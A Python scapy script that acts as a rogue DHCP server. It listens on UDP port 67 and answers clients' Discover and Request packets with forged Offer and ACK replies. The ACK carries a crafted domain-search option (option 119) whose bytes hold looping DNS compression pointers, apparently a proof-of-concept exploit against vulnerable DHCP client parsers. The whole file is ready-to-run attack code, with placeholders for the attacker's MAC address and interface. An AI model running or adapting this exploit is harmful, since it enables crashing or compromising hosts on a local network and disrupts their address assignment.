#!/usr/bin/python

from scapy.all import *
import binascii

src_mac = "[YOUR_MAC_ADDR]"
dst_addr = "192.168.33.123"
src_addr = "192.168.33.11"
gateway = "192.168.33.1"
subnet_mask = "255.255.255.0"

iface = "[YOUR_INTERFACE]"
filter = "udp port 67"


def handle_packet(packet):
    eth = packet.getlayer(Ether)
    ip = packet.getlayer(IP)
    udp = packet.getlayer(UDP)
    bootp = packet.getlayer(BOOTP)
    dhcp = packet.getlayer(DHCP)
    dhcp_message_type = None

    if not dhcp:
        return False

    for opt in dhcp.options:
        if opt[0] == "message-type":
            dhcp_message_type = opt[1]

    # DHCP Offer
    if dhcp_message_type == 1:
        chaddr = binascii.unhexlify(eth.src.replace(":", ""))

        ethernet = Ether(dst=eth.src, src=src_mac)
        ip = IP(dst=dst_addr, src=src_addr)
        udp = UDP(sport=udp.dport, dport=udp.sport)
        bootp = BOOTP(
            op="BOOTREPLY",
            yiaddr=dst_addr,
            siaddr=gateway,
            chaddr=chaddr,
            xid=bootp.xid,
        )
        dhcp = DHCP(
            options=[
                ("message-type", "offer"),
                ("server_id", src_addr),
                ("subnet_mask", subnet_mask),
                ("end"),
            ]
        )

        ack = ethernet / ip / udp / bootp / dhcp
        sendp(ack, iface=iface)

    # DHCP ACK
    elif dhcp_message_type == 3:
        chaddr = binascii.unhexlify(eth.src.replace(":", ""))

        ethernet = Ether(dst=eth.src, src=src_mac)
        ip = IP(dst=dst_addr, src=src_addr)
        udp = UDP(sport=udp.dport, dport=udp.sport)
        bootp = BOOTP(
            op="BOOTREPLY",
            yiaddr=dst_addr,
            siaddr=gateway,
            chaddr=chaddr,
            xid=bootp.xid,
        )
        dhcp = DHCP(
            options=[
                ("message-type", "ack"),
                ("server_id", src_addr),
                ("lease_time", 43200),
                ("subnet_mask", subnet_mask),
                (
                    119,
                    b"\x02\xc0\x01\x00\x01\x41\xc0\x01",
                ),
                ("end"),
            ]
        )

        ack = ethernet / ip / udp / bootp / dhcp
        sendp(ack, iface=iface)


print("Sniffing...")
sniff(iface=iface, filter=filter, prn=handle_packet)
